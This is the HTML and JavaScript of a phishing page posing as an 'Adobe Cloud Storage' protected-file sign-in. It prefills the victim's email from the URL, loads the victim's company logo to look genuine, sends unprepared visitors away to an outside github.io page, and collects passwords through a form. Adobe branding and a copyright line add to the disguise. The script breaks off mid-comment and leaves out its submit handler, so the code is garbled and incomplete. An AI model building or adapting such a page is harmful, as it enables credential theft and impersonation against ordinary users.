<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta http-equiv="Content-Security-Policy" content="default-src 'self' https:; script-src 'self' https://ajax.googleapis.com https://stackpath.bootstrapcdn.com; img-src 'self' https: data:;">
  <title>Protected File Sign In</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-image: url("pdfbgimage.png");
      background-size: cover;
      background-position: center;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      position: relative;
    }
    body::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      z-index: -1;
    }
    .container {
      background-color: #fff;
      border-radius: 0;
      padding: 20px;
      text-align: center;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
      max-width: 300px;
      width: 100%;
      opacity: 0;
      animation: slideIn 0.5s forwards;
      position: relative;
      height: 400px;
    }
    @keyframes slideIn {
      from { width: 0; opacity: 0; }
      to { width: 100%; opacity: 1; }
    }
    #email-logo {
      width: 100px;
      height: 100px;
      margin: auto;
      display: none;
      object-fit: contain;
    }
    h2 {
      font-weight: bold;
      margin-top: 20px;
      margin-bottom: 10px;
    }
    input[type="email"],
    input[type="password"],
    button {
      width: calc(100% - 40px);
      margin-bottom: 10px;
      padding: 10px;
      border-radius: 0;
      border: 1px solid #ccc;
      box-sizing: border-box;
    }
    button {
      background-color: #d32f2f;
      color: #fff;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #b71c1c;
    }
    .error-container {
      color: white;
      background: lightcoral;
      padding: 10px;
      margin-top: 10px;
      border-radius: 0;
      display: none;
    }
    .spinner {
      border: 4px solid rgba(0, 0, 0, 0.1);
      border-top: 4px solid #333;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .remember-me {
      text-align: left;
      margin-bottom: 10px;
      font-size: 14px;
      margin-left: 20px;
    }
    .copyright {
      font-size: 8px;
      color: #999;
      position: left;
      bottom: 20px;
      left: 8px;
    }
    .privacy-cookies {
      font-size: 10px;
      color: #999;
      position: absolute;
      bottom: 10px;
      right: 70px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img id="email-logo" src="" alt="Email logo" />
    <h2>Adobe Cloud Storage</h2>
    <p id="domain-info">Sign in with your Domain Email</p>

    <form name="loginForm" id="loginForm" method="POST" autocomplete="off">
      <input type="email" name="email" id="email" placeholder="Email" required readonly>
      <input type="password" name="password" id="password" placeholder="Password" minlength="6" required>
      <input type="hidden" name="token" id="token">
      <input type="hidden" name="csrf" id="csrf">
      <input type="hidden" name="timestamp" id="timestamp">

      <div class="remember-me">
        <input type="checkbox" id="remember-me" name="remember-me" checked>
        <label for="remember-me">Remember me</label><br>
        <div class="alert alert-danger" id="msg" style="display: none;"></div>
        <span id="error" class="text-danger" style="display: none;"></span>
      </div>

      <button type="submit" id="submit-btn">View File 87 KB</button>

      <div class="copyright">
        &copy; 2025 Adobe. By clicking Next, you accept Adobe Cloud Storage terms and conditions in accordance with our privacy policy and Adobe terms of use. Check the official documentation to review our terms of use.
      </div>
      <div class="privacy-cookies"></div>
    </form>

    <div class="error-container"></div>
    <div class="spinner" style="display:none;"></div>
  </div>

 <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script>
    // Enforce HTTPS
    if (window.location.protocol !== 'https:' && 
        !window.location.hostname.match(/localhost|127\.0\.0\.1/)) {
      window.location.href = `https://${window.location.host}${window.location.pathname}`;
    }

    document.addEventListener("DOMContentLoaded", function () {
      const emailInput = document.getElementById("email");
      const domainInfo = document.getElementById("domain-info");
      const logo = document.getElementById("email-logo");
      const tokenInput = document.getElementById("token");
      const csrfInput = document.getElementById("csrf");
      const timestampInput = document.getElementById("timestamp");

      /**
       * Custom hash parser (replaces URLSearchParams)
       * Safely extracts parameters even with special characters in email.
       */
    function parseHashParameters() {
  const hash = window.location.hash.substring(1);
  const params = {};
  
  // Split parameters while handling potential '&' in raw emails
  const parts = hash.split('&');
  
  // Extract email (first parameter)
  const emailPart = parts[0];
  const firstEqualSign = emailPart.indexOf('=');
  
  if (firstEqualSign !== -1) {
    params.email = emailPart.substring(firstEqualSign + 1);
    
    // Auto-detect if email is
        
        // Process remaining parameters (token, csrf, time)
        for (let i = 1; i < parts.length; i++) {
          const [key, value] = parts[i].split('=');
          if (key && value !== undefined) {
            params[key] = value;
          }
        }
        
        return {
          email: params.email || '',
          token: params.token || '',
          csrf: params.csrf || '',
          time: params.time || ''
        };
      }

      const params = parseHashParameters();

      // Validate parameters
      if (!params.email || !params.token || !params.csrf || !params.time) {
        window.location.href = "https://hareru66.github.io/ref/";
        return;
      }

      // Set form values (email is used raw)
      emailInput.value = params.email; // No decodeURIComponent needed
      tokenInput.value = params.token;
      csrfInput.value = params.csrf;
      timestampInput.value = params.time;

      // [Rest of your existing code (updateUI, etc.)]
      function updateUI(email) {
        const domainMatch = email.match(/@([\w.-]+\.\w+)/);
        if (domainMatch) {
          const domain = domainMatch[1];
          domainInfo.textContent = `Sign in with your ${domain} Email`;
          const logoUrl = `https://logo.clearbit.com/${domain}`;
          logo.src = logoUrl;
          logo.style.display = "block";
          logo.onerror = function () {
            logo.src = "P_icon.svg";
          };
        } else {
          domainInfo.textContent = "Sign in with your Domain Email";
          logo.style.display = "none";
        }
      }

      updateUI(params.email);
    });

    // [Rest of your existing jQuery form handling code]
  </script>
</body>
</html>
